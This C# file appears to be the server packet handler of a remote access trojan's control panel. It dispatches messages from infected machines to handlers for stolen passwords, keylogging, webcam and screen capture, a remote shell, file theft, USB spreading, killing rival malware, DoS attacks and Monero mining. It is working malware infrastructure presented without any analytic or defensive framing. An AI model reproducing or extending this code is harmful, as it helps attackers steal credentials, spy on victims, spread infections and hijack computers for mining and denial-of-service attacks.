﻿using Server.Connection;
using Server.MessagePack;
using System.Drawing;
using System.Windows.Forms;
using System.Threading;
using Server.Algorithm;
using System.IO;
using System.Diagnostics;

namespace Server.Handle_Packet
{
    public class Packet
    {
        public Clients client;
        public byte[] data;

        public void Read(object o)
        {
            try
            {
                MsgPack unpack_msgpack = new MsgPack();
                unpack_msgpack.DecodeFromBytes(data);

                Program.form1.Invoke((MethodInvoker)(() =>
                {
                    switch (unpack_msgpack.ForcePathObject("Packet").AsString)
                    {
                        case "ClientInfo":
                            {
                                new HandleListView().AddToListview(client, unpack_msgpack);
                                break;
                            }

                        case "Ping":
                            {
                                new HandlePing(client, unpack_msgpack);
                                break;
                            }

                        case "Logs":
                            {
                                new HandleLogs().Addmsg($"Client {client.TcpClient.RemoteEndPoint.ToString().Split(':')[0]} {unpack_msgpack.ForcePathObject("Message").AsString}", Color.Black);
                                break;
                            }

                        case "thumbnails":
                            {
                                client.ID = unpack_msgpack.ForcePathObject("Hwid").AsString;
                                new HandleThumbnails(client, unpack_msgpack);
                                break;
                            }

                        case "BotKiller":
                            {
                                new HandleLogs().Addmsg($"Client {client.TcpClient.RemoteEndPoint.ToString().Split(':')[0]} found {unpack_msgpack.ForcePathObject("Count").AsString} malwares and killed them successfully", Color.Orange);
                                break;
                            }

                        case "usb":
                            {
                                new HandleLogs().Addmsg($"Client {client.TcpClient.RemoteEndPoint.ToString().Split(':')[0]} found {unpack_msgpack.ForcePathObject("Count").AsString} USB drivers and spreaded them successfully", Color.Purple);
                                break;
                            }

                        case "recoveryPassword":
                            {
                                new HandleRecovery(client, unpack_msgpack);
                                break;
                            }

                        case "Received":
                            {
                                new HandleListView().Received(client);
                                break;
                            }

                        case "Error":
                            {
                                new HandleLogs().Addmsg($"Client {client.TcpClient.RemoteEndPoint.ToString().Split(':')[0]} error: {unpack_msgpack.ForcePathObject("Error").AsString}", Color.Red);
                                break;
                            }
                        case "remoteDesktop":
                            {
                                new HandleRemoteDesktop().Capture(client, unpack_msgpack);
                                break;
                            }

                        case "processManager":
                            {
                                new HandleProcessManager().GetProcess(client, unpack_msgpack);
                                break;
                            }


                        case "socketDownload":
                            {
                                new HandleFileManager().SocketDownload(client, unpack_msgpack);
                                break;
                            }

                        case "keyLogger":
                            {
                                new HandleKeylogger(client, unpack_msgpack);
                                break;
                            }

                        case "fileManager":
                            {
                                new HandleFileManager().FileManager(client, unpack_msgpack);
                                break;
                            }

                        case "shell":
                            {
                                new HandleShell(unpack_msgpack, client);
                                break;
                            }

                        case "chat":
                            {
                                new HandleChat().Read(unpack_msgpack, client);
                                break;
                            }

                        case "chat-":
                            {
                                new HandleChat().GetClient(unpack_msgpack, client);
                                break;
                            }

                        case "reportWindow":
                            {
                                new HandleReportWindow(client, unpack_msgpack.ForcePathObject("Report").AsString);
                                break;
                            }

                        case "reportWindow-":
                            {
                                if (Settings.ReportWindow == false)
                                {
                                    MsgPack packet = new MsgPack();
                                    packet.ForcePathObject("Packet").AsString = "reportWindow";
                                    packet.ForcePathObject("Option").AsString = "stop";
                                    ThreadPool.QueueUserWorkItem(client.Send, packet.Encode2Bytes());
                                    return;
                                }
                                lock (Settings.LockReportWindowClients)
                                    Settings.ReportWindowClients.Add(client);
                                break;
                            }

                        case "webcam":
                            {
                                new HandleWebcam(unpack_msgpack, client);
                                break;
                            }

                        case "dosAdd":
                            {
                                new HandleDos().Add(client, unpack_msgpack);
                                break;
                            }

                        case "sendPlugin":
                            {
                                foreach (string plguins in unpack_msgpack.ForcePathObject("Hashes").AsString.Split(','))
                                {
                                    client.SendPlugin(plguins.Trim());
                                }
                                break;
                            }

                        case "sendPlugin+":
                            {
                                client.ReSendPAlllugins();
                                break;
                            }

                        case "GetXmr":
                            {
                                new HandleMiner().SendMiner(client);
                                break;
                            }
                    }
                }));
            }
            catch
            {
                client?.Disconnected();
                return;
            }
        }
    }
}